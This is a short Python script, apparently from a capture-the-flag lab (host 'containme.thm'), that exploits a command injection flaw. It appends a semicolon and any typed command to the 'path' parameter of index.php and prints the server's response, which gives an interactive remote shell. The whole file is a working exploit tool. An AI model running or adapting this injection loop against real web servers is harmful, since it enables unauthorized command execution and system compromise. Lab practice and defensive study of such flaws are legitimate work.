import requests

path = "http://containme.thm/index.php?path=;"

while True:
    command = input("Insert command: ")

    if command.lower() == "exit":
        print("Exiting...")
        break

    url = path + command

    try:
        response = requests.get(url)
        print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
